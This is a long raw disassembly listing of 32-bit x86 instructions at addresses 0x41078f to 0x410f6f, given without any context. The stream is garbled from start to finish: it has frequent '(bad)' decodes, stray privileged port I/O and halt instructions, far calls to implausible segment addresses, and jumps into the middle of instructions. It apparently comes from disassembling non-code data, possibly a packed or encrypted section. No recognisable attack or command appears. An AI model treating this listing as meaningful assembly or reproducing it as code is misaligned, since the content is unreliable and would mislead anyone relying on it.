  41078f:	mov    ch,0x91
  410791:	arpl   cx,bx
  410793:	cwde   
  410794:	sbb    BYTE PTR [ecx+ebp*1],bh
  410797:	push   0x5a0d5b47
  41079c:	xchg   ecx,eax
  41079d:	(bad)  
  41079e:	sbb    edi,edi
  4107a0:	push   ds
  4107a1:	mov    eax,esi
  4107a3:	xlat   BYTE PTR ds:[ebx]
  4107a4:	in     al,0x7c
  4107a6:	rcl    ecx,0xfe
  4107a9:	retf   
  4107aa:	push   ecx
  4107ab:	adc    BYTE PTR [ebp-0x3a],ch
  4107ae:	push   ss
  4107af:	in     eax,0xdf
  4107b1:	call   0x953:0x6c2f588b
  4107b8:	fsubr  DWORD PTR [esi-0x73]
  4107bb:	sbb    ecx,esp
  4107bd:	test   ecx,esi
  4107bf:	sbb    ebx,DWORD PTR ds:[esi]
  4107c2:	push   0x25
  4107c4:	mov    al,ds:0xec5b8295
  4107c9:	pop    eax
  4107ca:	scas   eax,DWORD PTR es:[edi]
  4107cb:	or     eax,0xfdb6659b
  4107d0:	cmp    ax,0xef96
  4107d4:	cld    
  4107d5:	cwde   
  4107d6:	jb     0x4107a3
  4107d8:	ds jno 0x4107e2
  4107db:	dec    edx
  4107dc:	jmp    0x4107cc
  4107de:	adc    al,0xe2
  4107e0:	sub    dl,dh
  4107e2:	jno    0x4107f8
  4107e4:	mov    DWORD PTR [ebp+0x4f],ebx
  4107e7:	mov    eax,ds:0xd18b5c23
  4107ec:	ffree  st(7)
  4107ee:	inc    ebp
  4107ef:	add    eax,edx
  4107f1:	lea    esp,[edx+eiz*8+0x18]
  4107f5:	sbb    edx,ecx
  4107f7:	add    bl,ch
  4107f9:	inc    ebx
  4107fa:	mov    al,0x38
  4107fc:	test   al,0x86
  4107fe:	cld    
  4107ff:	test   bl,bh
  410801:	push   esp
  410802:	or     BYTE PTR [edi*1-0x7ac03376],bh
  410809:	sahf   
  41080a:	in     eax,dx
  41080b:	loopne 0x410828
  41080d:	adc    DWORD PTR [edx-0x53031d2],0xffffff97
  410814:	add    eax,0x9ac4dc5
  410819:	outs   dx,BYTE PTR ds:[esi]
  41081a:	inc    edx
  41081b:	inc    ecx
  41081c:	in     al,dx
  41081d:	adc    DWORD PTR [edx+esi*8],edi
  410820:	leave  
  410821:	adc    DWORD PTR [ecx-0x1456824a],edi
  410827:	xor    eax,DWORD PTR [ebx+0x63]
  41082a:	es stc 
  41082c:	sbb    eax,DWORD PTR [ebx+edi*1-0x6ea43025]
  410833:	adc    bh,dh
  410835:	(bad)  
  410836:	pop    ss
  410837:	out    dx,eax
  410838:	inc    esp
  410839:	popa   
  41083a:	loope  0x4107f7
  41083c:	xor    BYTE PTR [ecx],dh
  41083e:	mov    ch,0x5b
  410840:	adc    al,0x0
  410842:	xlat   BYTE PTR ds:[ebx]
  410843:	jl     0x41083a
  410845:	mov    dl,0x56
  410847:	jno    0x410880
  410849:	mov    eax,0xe2951936
  41084e:	cld    
  41084f:	imul   ebx,DWORD PTR [eax+0x46c0454f],0x42544f8b
  410859:	fcomp  DWORD PTR [edi]
  41085b:	cld    
  41085c:	jge    0x41080d
  41085e:	lods   al,BYTE PTR ds:[esi]
  41085f:	add    DWORD PTR [ecx+0x1084273d],0x1bed5a26
  410869:	hlt    
  41086a:	or     al,BYTE PTR [ecx-0x246fdab8]
  410870:	sbb    eax,0x5426c292
  410875:	push   es
  410876:	mov    bh,0xfc
  410878:	call   0xf74f4c7f
  41087d:	loopne 0x41083f
  41087f:	scas   eax,DWORD PTR es:[edi]
  410880:	cmovns esp,DWORD PTR [esi-0x20]
  410884:	cmp    bl,0xee
  410887:	adc    DWORD PTR [edi+0xc20f992],esi
  41088d:	outs   dx,DWORD PTR ds:[esi]
  41088e:	out    0xad,eax
  410890:	cli    
  410891:	sub    al,0xe
  410893:	je     0x4108b9
  410895:	data16 and al,0xfe
  410898:	cwde   
  410899:	leave  
  41089a:	aas    
  41089b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41089c:	stos   DWORD PTR es:[edi],eax
  41089d:	jecxz  0x410835
  41089f:	pop    es
  4108a0:	add    bl,ah
  4108a2:	mov    cl,0xb8
  4108a4:	add    BYTE PTR [ecx],al
  4108a6:	jmp    0x4108f5
  4108a8:	jp     0x4108ba
  4108aa:	or     BYTE PTR [esi+ecx*1+0x60],0xd5
  4108af:	scas   eax,DWORD PTR es:[edi]
  4108b0:	scas   al,BYTE PTR es:[edi]
  4108b1:	inc    ebx
  4108b2:	int    0x25
  4108b4:	dec    esi
  4108b5:	or     dl,al
  4108b7:	pop    edi
  4108b8:	mov    dh,0x56
  4108ba:	(bad)  
  4108bb:	fnstsw WORD PTR [ecx]
  4108bd:	adc    eax,0x8e0f88c5
  4108c2:	leave  
  4108c3:	mov    ebp,0xbf5bc708
  4108c8:	inc    ebx
  4108c9:	aad    0x92
  4108cb:	mov    bh,0x8b
  4108cd:	or     esi,DWORD PTR [eax]
  4108cf:	clc    
  4108d0:	retf   0x8136
  4108d3:	cmp    al,0xcc
  4108d5:	pop    esp
  4108d6:	xchg   edx,eax
  4108d7:	sub    BYTE PTR [eax+0x6fdd0052],al
  4108dd:	cld    
  4108de:	adc    bh,BYTE PTR [ecx+0x31]
  4108e1:	add    eax,0x44bc3af
  4108e6:	add    DWORD PTR [eax+0x1],edx
  4108e9:	call   0x66632db4
  4108ee:	jbe    0x410921
  4108f0:	rol    DWORD PTR [ecx+0xebb083b],1
  4108f6:	in     al,0x62
  4108f8:	loope  0x4108d5
  4108fa:	sub    esi,eax
  4108fc:	fwait
  4108fd:	ja     0x41093c
  4108ff:	mov    esi,es
  410901:	stos   DWORD PTR es:[edi],eax
  410902:	xchg   esp,eax
  410903:	and    cl,BYTE PTR [ecx+0x4c0b162e]
  410909:	add    eax,0xf41a42c3
  41090e:	ret    
  41090f:	sbb    ebp,DWORD PTR [esi]
  410911:	test   DWORD PTR [eax],0xa5b1d01f
  410917:	inc    esp
  410918:	cld    
  410919:	inc    ecx
  41091a:	fst    QWORD PTR [edx]
  41091c:	mov    ds:0xc3fb78e3,eax
  410921:	push   edi
  410922:	popa   
  410923:	jl     0x410909
  410925:	jl     0x4108b3
  410927:	pop    esp
  410928:	std    
  410929:	or     eax,0xb4a1f75
  41092e:	aas    
  41092f:	pop    es
  410930:	in     eax,dx
  410931:	sbb    dh,BYTE PTR [ebp+0x7b]
  410934:	add    al,0x99
  410936:	test   al,0x87
  410938:	jge    0x4108e6
  41093a:	pop    edi
  41093b:	push   edx
  41093c:	mov    esi,ebx
  41093e:	fdivp  st(0),st
  410940:	xchg   ecx,eax
  410941:	sub    al,0xd4
  410943:	popf   
  410944:	aas    
  410945:	sti    
  410946:	mov    ch,0x44
  410948:	xor    ebx,DWORD PTR [eax]
  41094a:	out    dx,al
  41094b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41094c:	cmc    
  41094d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41094e:	or     eax,DWORD PTR [eax+0x21]
  410951:	and    esp,DWORD PTR [bp+si]
  410954:	call   0x488b8737
  410959:	retf   0x70ac
  41095c:	mov    ebp,0x9d7cbf30
  410961:	adc    BYTE PTR [eax-0x121fd73],dl
  410967:	lods   al,BYTE PTR ds:[esi]
  410968:	ret    
  410969:	pop    esp
  41096a:	imul   ebp,DWORD PTR [ebx-0x747a48bf],0xffffff85
  410971:	push   esi
  410972:	mov    ds:0xf4a4bcfe,al
  410977:	icebp  
  410978:	ror    BYTE PTR [esi+0x1cf8081d],0x2
  41097f:	xchg   ebx,eax
  410980:	lods   eax,DWORD PTR ds:[esi]
  410981:	jbe    0x410948
  410983:	sti    
  410984:	nop
  410985:	in     eax,dx
  410986:	cmp    DWORD PTR [ecx-0x6c8021c3],eax
  41098c:	jmp    FWORD PTR [edi]
  41098e:	lods   al,BYTE PTR ds:[esi]
  41098f:	cmp    eax,0x43b6e328
  410994:	and    DWORD PTR [eax],eax
  410996:	pusha  
  410997:	xchg   si,ax
  410999:	fwait
  41099a:	jmp    0x3ca2e38a
  41099f:	push   ebx
  4109a0:	lock fst QWORD PTR [edx-0x5eba33a3]
  4109a7:	sub    eax,0x9803c9a3
  4109ac:	ret    0xa36f
  4109af:	or     ch,bh
  4109b1:	dec    BYTE PTR [esi]
  4109b3:	fs push esi
  4109b5:	inc    esi
  4109b6:	adc    DWORD PTR ss:0xa3adc68d,edx
  4109bd:	or     esp,DWORD PTR ds:0x6b3b2337
  4109c3:	sub    DWORD PTR [esi+0x76308793],esp
  4109c9:	hlt    
  4109ca:	dec    ecx
  4109cb:	or     ecx,ebx
  4109cd:	push   ds
  4109ce:	repz pop ebp
  4109d0:	mov    DWORD PTR ds:0x169bdfbf,edi
  4109d6:	data16 (bad) 
  4109d8:	mov    BYTE PTR [ecx+esi*8+0x1092955d],bh
  4109df:	idiv   BYTE PTR [ebx-0x27ebed3]
  4109e5:	int3   
  4109e6:	or     al,0x65
  4109e8:	mov    ds:0xfebbd7c5,eax
  4109ed:	mov    eax,0x8393442f
  4109f2:	ins    BYTE PTR es:[edi],dx
  4109f3:	dec    esp
  4109f4:	sbb    bl,dl
  4109f6:	lea    edi,[ecx+0x3e0b0d27]
  4109fc:	and    BYTE PTR [ebx-0x3cd580c9],0x37
  410a03:	(bad)  
  410a04:	xlat   BYTE PTR ds:[ebx]
  410a05:	imul   edi,DWORD PTR [edx-0x7e8505d3],0x4c
  410a0c:	shl    edi,0x7d
  410a0f:	gs pop ecx
  410a11:	ss and dh,bl
  410a14:	sub    dh,BYTE PTR [ecx-0x37]
  410a17:	cmp    edi,0xffffff88
  410a1a:	leave  
  410a1b:	mov    esp,0x2dc8ca93
  410a20:	inc    eax
  410a21:	mov    eax,0x5ffa08fb
  410a26:	cmp    al,0x22
  410a28:	jae    0x4109f6
  410a2a:	or     bh,BYTE PTR [eax*8+0x5dc95e0d]
  410a31:	pusha  
  410a32:	pushf  
  410a33:	lahf   
  410a34:	xchg   esi,eax
  410a35:	pop    edi
  410a36:	sub    eax,DWORD PTR [eax]
  410a38:	cli    
  410a39:	call   FWORD PTR [ebx+ecx*2+0x13de5ca2]
  410a40:	(bad)  
  410a41:	xchg   edi,eax
  410a42:	cs cwde 
  410a44:	xchg   esi,eax
  410a45:	int    0x70
  410a47:	jae    0x4109e0
  410a49:	jnp    0x410a0f
  410a4b:	pop    ebp
  410a4c:	sub    eax,0x18816abb
  410a51:	push   es
  410a52:	and    al,dh
  410a54:	stos   DWORD PTR es:[edi],eax
  410a55:	aaa    
  410a56:	aaa    
  410a57:	loope  0x410a32
  410a59:	sub    eax,0x640e121d
  410a5e:	inc    ecx
  410a5f:	pushf  
  410a60:	aad    0x9f
  410a62:	pushf  
  410a63:	daa    
  410a64:	les    esi,FWORD PTR [esi]
  410a66:	or     ecx,esi
  410a68:	fisub  WORD PTR [ecx+ecx*1-0x2a]
  410a6c:	jl     0x410a57
  410a6e:	ds in  al,0x4
  410a71:	sbb    al,0x4
  410a73:	inc    ecx
  410a74:	add    eax,0x56fcfc10
  410a79:	cmp    al,0xfb
  410a7b:	mov    ebp,0xc110653f
  410a80:	adc    dh,BYTE PTR ss:[ecx+eiz*2]
  410a84:	mov    edi,0x6b99baed
  410a89:	and    BYTE PTR [ebp+0x2],cl
  410a8c:	(bad)  
  410a8e:	shl    BYTE PTR [esi+0x3],1
  410a91:	xor    al,0x41
  410a93:	jbe    0x410a82
  410a95:	add    edi,0x375da724
  410a9b:	push   0x45
  410a9d:	mov    ds:0x47b25881,al
  410aa2:	mov    ds:0xf8015a00,al
  410aa7:	add    ecx,DWORD PTR [ebx+0x51]
  410aaa:	pop    eax
  410aab:	mov    bh,0x8
  410aad:	inc    ebx
  410aae:	(bad)  
  410ab0:	push   edi
  410ab1:	sbb    dl,bl
  410ab3:	lods   al,BYTE PTR ds:[esi]
  410ab4:	cld    
  410ab5:	pop    ss
  410ab6:	inc    esp
  410ab7:	add    DWORD PTR [edx+edx*8-0x3876f34d],edi
  410abe:	mov    ah,BYTE PTR [ebp-0x3f]
  410ac1:	push   ebx
  410ac2:	sub    al,bl
  410ac4:	call   0xced95acb
  410ac9:	call   DWORD PTR [eax-0x1583206d]
  410acf:	call   0xb9bec0ec
  410ad4:	inc    edi
  410ad5:	fsub   st,st(0)
  410ad7:	test   edi,ebp
  410ad9:	fmul   QWORD PTR [eax+0x4b4f2d9e]
  410adf:	(bad)  
  410ae0:	pop    ds
  410ae1:	test   DWORD PTR [edi+0x7fd695d6],ebx
  410ae7:	mov    ds:0x37bc94f7,al
  410aec:	sbb    al,0x7a
  410aee:	adc    al,0x75
  410af0:	(bad)  
  410af1:	jns    0x410ad5
  410af3:	xor    esi,DWORD PTR [ecx]
  410af5:	mov    esi,0x41cab95e
  410afa:	and    edi,ebx
  410afc:	push   DWORD PTR [edi]
  410afe:	inc    edi
  410aff:	adc    al,0xc6
  410b01:	rcr    BYTE PTR [ebx-0x21],cl
  410b04:	mov    ss,edx
  410b06:	cli    
  410b07:	jg     0x410acb
  410b09:	shl    BYTE PTR [edi+0x1ea701ff],0xda
  410b10:	mov    ah,BYTE PTR [eax+0x28]
  410b13:	pushf  
  410b14:	push   ds
  410b15:	xor    dh,dh
  410b17:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  410b19:	aad    0x67
  410b1b:	div    BYTE PTR [ebp-0x42]
  410b1e:	sar    dl,cl
  410b20:	lods   eax,DWORD PTR ds:[esi]
  410b21:	cmp    ebx,DWORD PTR [edi]
  410b23:	xchg   esp,eax
  410b24:	int    0x38
  410b26:	in     al,0x39
  410b28:	or     bh,dh
  410b2a:	mov    ch,0xab
  410b2c:	ret    0x67c9
  410b2f:	mov    ds:0x1fc0a2e5,eax
  410b34:	fsqrt  
  410b36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b37:	adc    BYTE PTR [ebp+0x386e5d4c],dl
  410b3d:	mov    edi,0x409adc4e
  410b42:	jecxz  0x410ae8
  410b44:	sub    al,0x8
  410b46:	or     ebp,ebp
  410b48:	mov    ebp,0x59fa4272
  410b4d:	mov    bh,0xf6
  410b4f:	cs or  al,0xed
  410b52:	sti    
  410b53:	xchg   BYTE PTR [eax-0x5],bl
  410b56:	lods   al,BYTE PTR ds:[esi]
  410b57:	pushf  
  410b58:	mov    ecx,0x8b7bffe2
  410b5d:	jp     0x410b04
  410b5f:	scas   eax,DWORD PTR es:[edi]
  410b60:	leave  
  410b61:	mov    bh,0x6
  410b63:	add    eax,0x70b17011
  410b68:	(bad)  
  410b69:	and    eax,ebx
  410b6b:	mov    BYTE PTR [ebx+0x3ba30fed],dl
  410b71:	aam    0x86
  410b73:	shl    ebx,1
  410b75:	arpl   WORD PTR [edx+0x7f272200],sp
  410b7b:	pop    DWORD PTR [ebx-0x3e97fef6]
  410b81:	aaa    
  410b82:	daa    
  410b83:	pop    esi
  410b84:	sub    eax,DWORD PTR ds:0x66c73133
  410b8a:	dec    BYTE PTR [ebp+0x41]
  410b8d:	ss out 0xd9,eax
  410b90:	je     0x410bad
  410b92:	or     BYTE PTR [edi+edi*8-0x21],0x84
  410b97:	(bad)  
  410b98:	outs   dx,BYTE PTR ds:[esi]
  410b99:	stc    
  410b9a:	add    DWORD PTR [esi+0x460d3185],esp
  410ba0:	sar    BYTE PTR [eax-0x5343922f],0xff
  410ba7:	arpl   WORD PTR [eax],bx
  410ba9:	jmp    0x76b8:0xe04256a8
  410bb0:	lods   al,BYTE PTR ds:[esi]
  410bb1:	mov    WORD PTR [eax+edi*8-0x10],ds
  410bb5:	push   ecx
  410bb6:	sbb    al,0x5f
  410bb8:	mov    dh,0x2c
  410bba:	cmp    eax,0x28705a8e
  410bbf:	inc    esp
  410bc0:	mov    edx,0x3e2d1442
  410bc5:	aaa    
  410bc6:	cld    
  410bc7:	xor    BYTE PTR [ecx],ch
  410bc9:	mov    BYTE PTR [ebx],bh
  410bcb:	inc    esi
  410bcc:	mov    esi,edi
  410bce:	inc    esi
  410bcf:	sahf   
  410bd0:	cwde   
  410bd1:	dec    eax
  410bd2:	mov    ebx,0x170c6c0c
  410bd7:	outs   dx,BYTE PTR ds:[esi]
  410bd8:	mov    esp,0x7eed3735
  410bdd:	popf   
  410bde:	idiv   esi
  410be0:	or     esp,DWORD PTR [ebp+0xc]
  410be3:	daa    
  410be4:	outs   dx,BYTE PTR ds:[esi]
  410be5:	jl     0x410c47
  410be7:	inc    esi
  410be8:	dec    ecx
  410be9:	xor    BYTE PTR [eax],ah
  410beb:	xchg   ebx,eax
  410bec:	sbb    DWORD PTR [edi],esi
  410bee:	scas   eax,DWORD PTR es:[edi]
  410bef:	mov    bl,0xc6
  410bf1:	call   0xf69aa135
  410bf6:	(bad)  
  410bf8:	and    edi,DWORD PTR [ecx-0x31134a87]
  410bfe:	in     al,0xba
  410c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c01:	xor    DWORD PTR [ebx+0x4035cbab],esp
  410c07:	add    edx,DWORD PTR [ebx+edx*2-0x2c3ae587]
  410c0e:	dec    esi
  410c0f:	in     al,0x86
  410c11:	ds ds push ecx
  410c14:	sbb    ebp,ebx
  410c16:	(bad)  
  410c17:	shl    dl,1
  410c19:	imul   eax,DWORD PTR ds:0xeb803740,0x55
  410c20:	sub    eax,DWORD PTR [eax+0x25dddfbd]
  410c26:	loope  0x410c87
  410c28:	sub    al,BYTE PTR [esi]
  410c2a:	ss xchg dl,al
  410c2d:	xor    eax,0xfbf5e032
  410c32:	and    DWORD PTR [ecx-0x3c],0x37
  410c36:	push   ss
  410c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410c38:	jae    0x410c96
  410c3a:	cmp    bh,BYTE PTR [esi-0x1d]
  410c3d:	xchg   ecx,eax
  410c3e:	je     0x410c22
  410c40:	bnd jnp 0x410c61
  410c43:	(bad)
  410c46:	aaa    
  410c47:	repnz dec ebx
  410c49:	call   FWORD PTR [edi+0x65]
  410c4c:	out    dx,eax
  410c4d:	add    ch,BYTE PTR [esi+0x67]
  410c50:	push   ebp
  410c51:	popf   
  410c52:	or     ecx,DWORD PTR [edi-0x46a6dbdc]
  410c58:	mov    dl,0x42
  410c5a:	add    ch,BYTE PTR [edx+eax*2]
  410c5d:	and    BYTE PTR [edi+0x20],bl
  410c60:	rol    BYTE PTR [esi-0x7e],0x6c
  410c64:	sub    ch,BYTE PTR [eax-0x44]
  410c67:	pusha  
  410c68:	mov    ds:0x5ea70a2,eax
  410c6d:	hlt    
  410c6e:	push   0x5aa56ad5
  410c73:	jmp    0x410c1a
  410c75:	(bad)  
  410c76:	stos   BYTE PTR es:[edi],al
  410c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c78:	push   ebp
  410c79:	imul   edi,ebx,0xffffff9f
  410c7c:	fisttp WORD PTR [ebx-0x43]
  410c7f:	aam    0xcb
  410c81:	call   FWORD PTR [edi+ebx*1-0x52e12ad1]
  410c88:	mov    ds:0x62a3d6c7,al
  410c8d:	inc    ebp
  410c8e:	pop    ebx
  410c8f:	scas   eax,DWORD PTR es:[edi]
  410c90:	mov    al,ds:0x8a0d4146
  410c95:	mov    dl,0x95
  410c97:	(bad)  
  410c99:	(bad)  
  410c9a:	and    eax,0x8480b084
  410c9f:	lods   al,BYTE PTR ds:[esi]
  410ca0:	inc    eax
  410ca1:	inc    edx
  410ca2:	push   esi
  410ca3:	and    BYTE PTR [edi+eiz*2],ah
  410ca6:	mov    ebp,0xad77af73
  410cab:	ja     0x410c6b
  410cad:	imul   ebp,DWORD PTR [esi],0x3c
  410cb0:	popf   
  410cb1:	iret   
  410cb2:	mov    bl,0x9f
  410cb4:	mov    ebp,0x2f37df2e
  410cb9:	arpl   WORD PTR [esi-0x7388710f],cx
  410cbf:	cmp    DWORD PTR [edi+0x3d2656b9],edi
  410cc5:	js     0x410cbf
  410cc7:	jno    0x410d38
  410cc9:	(bad)  
  410cca:	pop    ds
  410ccb:	ja     0x410c54
  410ccd:	iret   
  410cce:	ret    0xee70
  410cd1:	dec    ebx
  410cd2:	arpl   WORD PTR [edi+eax*2-0x60],dx
  410cd6:	add    BYTE PTR [eax+0x30],al
  410cd9:	xchg   DWORD PTR [edx+esi*4-0x39],ebp
  410cdd:	add    edi,0x3990225
  410ce3:	cmp    BYTE PTR [edi+0x3b98a1f3],ah
  410ce9:	out    dx,eax
  410cea:	add    eax,0xbed20769
  410cef:	into   
  410cf0:	int3   
  410cf1:	xor    ebp,esi
  410cf3:	repz fwait
  410cf5:	repz (bad) 
  410cf7:	test   esi,0xbac503cd
  410cfd:	not    edi
  410cff:	fucomip st,st(3)
  410d01:	lds    edi,FWORD PTR [ebx+0x1a04a4e7]
  410d07:	or     al,0x13
  410d09:	add    BYTE PTR [eax+0x15c01c82],al
  410d0f:	pop    ds
  410d10:	jnp    0x410d64
  410d12:	jp     0x410cd1
  410d14:	loop   0x410caa
  410d16:	adc    esp,ebx
  410d18:	rcr    BYTE PTR ds:0x3561932b,0x4f
  410d1f:	sahf   
  410d20:	pop    ds
  410d21:	dec    ebx
  410d22:	setge  BYTE PTR ds:0x29bd6edb
  410d29:	outs   dx,BYTE PTR ds:[esi]
  410d2a:	std    
  410d2b:	cli    
  410d2c:	mul    ah
  410d2e:	push   ebp
  410d2f:	cmp    esp,0x5fb7ff88
  410d35:	ja     0x410d8a
  410d37:	mov    edx,0x4f75b8fe
  410d3c:	call   0x94050b92
  410d41:	pop    ss
  410d42:	pop    ebp
  410d43:	jbe    0x410d2d
  410d45:	xor    esp,DWORD PTR [ebx-0x19]
  410d48:	scas   al,BYTE PTR es:[edi]
  410d49:	dec    ebx
  410d4a:	jnp    0x410d18
  410d4c:	loop   0x410d46
  410d4e:	sub    BYTE PTR fs:[eax+0x3],ch
  410d52:	inc    edx
  410d53:	mov    ebx,0x2c587db3
  410d58:	pop    edx
  410d59:	fimul  WORD PTR [eax-0x5f]
  410d5c:	enter  0xf723,0xff
  410d60:	fnsave es:[edi-0x2c]
  410d64:	cli    
  410d65:	test   esp,0x313e4761
  410d6b:	neg    ah
  410d6d:	mov    dh,0x35
  410d6f:	outs   dx,BYTE PTR ds:[esi]
  410d70:	aas    
  410d71:	repz in eax,0xd1
  410d74:	jmp    0x26f37278
  410d79:	dec    esp
  410d7a:	mov    edx,0xc0005636
  410d7f:	imul   esi,DWORD PTR [edi],0xfd0936fd
  410d85:	(bad)  
  410d86:	outs   dx,DWORD PTR ds:[esi]
  410d87:	jle    0x410e05
  410d89:	pusha  
  410d8a:	cld    
  410d8b:	daa    
  410d8c:	pushf  
  410d8d:	cli    
  410d8e:	pushf  
  410d8f:	fdivr  DWORD PTR [esi]
  410d91:	sti    
  410d92:	xchg   BYTE PTR [eax+ecx*1],al
  410d95:	sub    al,dh
  410d97:	hlt    
  410d98:	neg    DWORD PTR [ebp-0xf]
  410d9b:	mov    bl,0xb4
  410d9d:	or     DWORD PTR [ecx],0xb19a5b85
  410da3:	jb     0x410d25
  410da5:	cwde   
  410da6:	(bad)  
  410da7:	dec    ebx
  410da8:	xchg   edx,eax
  410da9:	fmul   st,st(6)
  410dab:	mov    edx,DWORD PTR [ebp+0x1]
  410dae:	or     BYTE PTR es:[ecx+0xe],dh
  410db2:	loopne 0x410d92
  410db4:	jecxz  0x410d4c
  410db6:	les    eax,FWORD PTR [edx-0x577e125]
  410dbc:	loope  0x410e38
  410dbe:	and    BYTE PTR [edi-0x4ede0a03],dh
  410dc4:	out    0xf7,al
  410dc6:	jmp    DWORD PTR [edx]
  410dc8:	out    dx,al
  410dc9:	cli    
  410dca:	in     eax,dx
  410dcb:	out    0x52,eax
  410dcd:	repnz adc BYTE PTR [ebx-0x65],bl
  410dd1:	push   ecx
  410dd2:	dec    esi
  410dd3:	cmp    edi,edi
  410dd5:	jmp    0x6f43:0x96d030f4
  410ddc:	or     al,0xf0
  410dde:	sbb    ebx,ebp
  410de0:	aam    0x34
  410de2:	sbb    eax,0x567be4f9
  410de7:	lahf   
  410de8:	jecxz  0x410e3d
  410dea:	xor    BYTE PTR [eax],ch
  410dec:	test   DWORD PTR gs:[ebp+0x41],ebx
  410df0:	xor    al,0x49
  410df2:	inc    esi
  410df3:	cmpps  xmm4,XMMWORD PTR [ebp+0x33],0xd2
  410df8:	data16 fild WORD PTR [eax-0x1d]
  410dfc:	retf   
  410dfd:	test   eax,0xec802430
  410e02:	xchg   ebx,eax
  410e03:	jp     0x410e11
  410e05:	mov    al,ds:0x7189c57d
  410e0a:	in     al,0x99
  410e0c:	mov    esp,0x3c557981
  410e12:	ror    BYTE PTR [ebx],cl
  410e14:	rcl    DWORD PTR [eax],1
  410e16:	add    bl,ah
  410e18:	ja     0x410e16
  410e1a:	arpl   dx,dx
  410e1c:	shl    DWORD PTR [eax+ebp*1-0x21fda8c8],cl
  410e23:	xchg   ebp,eax
  410e24:	add    eax,0xa0f91e94
  410e29:	xchg   edi,eax
  410e2a:	mov    ebp,0x2c8f19b9
  410e2f:	outs   dx,DWORD PTR ds:[esi]
  410e30:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e31:	xchg   ebp,eax
  410e32:	sbb    eax,0x57246b50
  410e37:	adc    DWORD PTR [esi],esp
  410e39:	es add bl,ch
  410e3c:	test   DWORD PTR [eax+eiz*2+0x741dc88c],ecx
  410e43:	out    dx,eax
  410e44:	mov    ebp,0x740ab061
  410e49:	hlt    
  410e4a:	(bad)  
  410e4b:	repz rol bl,cl
  410e4e:	xor    DWORD PTR [ebp+0x7f7a8001],esi
  410e54:	pop    ebp
  410e55:	repz out 0x58,eax
  410e58:	mov    ecx,0xed64b15a
  410e5d:	ret    0x7858
  410e60:	out    dx,al
  410e61:	xchg   BYTE PTR [eax-0xe],bl
  410e64:	cli    
  410e65:	or     eax,0x3af0f731
  410e6a:	out    dx,al
  410e6b:	(bad)  
  410e6c:	in     eax,0x1d
  410e6e:	sub    ecx,ebp
  410e70:	mov    WORD PTR [eax+0x15],?
  410e73:	mov    ecx,0xfccc002e
  410e78:	cmp    DWORD PTR [ebx],esi
  410e7a:	jno    0x410eb7
  410e7c:	arpl   WORD PTR [esi+0x0],di
  410e7f:	cmp    cl,BYTE PTR [esi]
  410e81:	in     eax,0xbc
  410e83:	in     eax,dx
  410e84:	mov    dh,0x87
  410e86:	adc    al,BYTE PTR [ebx-0x3c]
  410e89:	retf   0xc000
  410e8c:	add    BYTE PTR [ebp+0x46],bh
  410e8f:	outs   dx,BYTE PTR ds:[esi]
  410e90:	out    0xfe,eax
  410e92:	cmp    DWORD PTR [edi],ecx
  410e94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410e95:	pop    ebp
  410e96:	mov    al,ds:0x1ee0f5c8
  410e9b:	xchg   esp,eax
  410e9c:	mov    ds:0x8e95dd8f,eax
  410ea1:	retf   0xe183
  410ea4:	arpl   cx,bp
  410ea6:	sbb    edi,DWORD PTR [ecx]
  410ea8:	add    DWORD PTR [esi+ebx*2-0x77e6250f],edi
  410eaf:	(bad)  
  410eb1:	dec    edi
  410eb2:	xor    esi,DWORD PTR [ebx]
  410eb4:	mov    al,0xe6
  410eb6:	ret    0x27ef
  410eb9:	jnp    0x410f36
  410ebb:	clc    
  410ebc:	loope  0x410e5d
  410ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ebf:	jo     0x410ed7
  410ec1:	setae  BYTE PTR [ecx-0x17]
  410ec5:	iret   
  410ec6:	aaa    
  410ec7:	(bad)  
  410ec8:	cmp    BYTE PTR [eax+0x5ac11297],ah
  410ece:	mov    edx,0xaa026761
  410ed3:	jo     0x410f11
  410ed5:	pop    ss
  410ed6:	add    BYTE PTR [ecx],al
  410ed8:	popf   
  410ed9:	std    
  410eda:	in     al,0x23
  410edc:	mov    ds:0xfb2674ba,eax
  410ee1:	push   cs
  410ee2:	add    eax,DWORD PTR [ecx-0x6fd7b819]
  410ee8:	retf   0x19c1
  410eeb:	cli    
  410eec:	mov    ebp,0x63e7db73
  410ef1:	jmp    0xd55482c0
  410ef6:	mov    ebx,0x8c5f43e6
  410efb:	push   ebx
  410efc:	dec    esi
  410efd:	cmp    esp,DWORD PTR [ebp-0x50]
  410f00:	jnp    0x410eeb
  410f02:	mov    cl,BYTE PTR [edi-0x72f90c1]
  410f08:	jmp    0x3f27:0x5a363ea7
  410f0f:	sub    edi,DWORD PTR [ebp-0x41602]
  410f15:	xor    eax,0x3dba5e36
  410f1a:	ss cmp al,0x73
  410f1d:	inc    ebp
  410f1e:	fiadd  DWORD PTR [ecx+0x38]
  410f21:	out    0xc1,eax
  410f23:	jbe    0x410f51
  410f25:	imul   edx,DWORD PTR ds:[ebp+0x74],0x6f
  410f2a:	push   0xffffffc7
  410f2c:	call   0xfe9e:0x78cef7b
  410f33:	cld    
  410f34:	xchg   esp,eax
  410f35:	or     DWORD PTR [edi+0x518ccf7f],edi
  410f3b:	add    BYTE PTR [ebp-0x66a43219],dl
  410f41:	repnz or al,0xc8
  410f44:	cmp    esp,DWORD PTR [eax]
  410f46:	add    al,0x0
  410f48:	test   al,0xb0
  410f4a:	and    bh,dh
  410f4c:	add    BYTE PTR [esi+0x70],al
  410f4f:	(bad)  
  410f50:	pop    edi
  410f51:	mov    esi,0x94727923
  410f56:	(bad)  
  410f58:	repnz dec edi
  410f5a:	arpl   di,cx
  410f5c:	imul   esi
  410f5e:	dec    esp
  410f5f:	sub    al,0x40
  410f61:	xlat   BYTE PTR ds:[ebx]
  410f62:	aam    0x35
  410f64:	in     al,dx
  410f65:	imul   ecx,DWORD PTR [edx],0xeed7dc00
  410f6b:	sub    ecx,ebp
  410f6d:	iret   
  410f6e:	das    
  410f6f:	dec    ebx
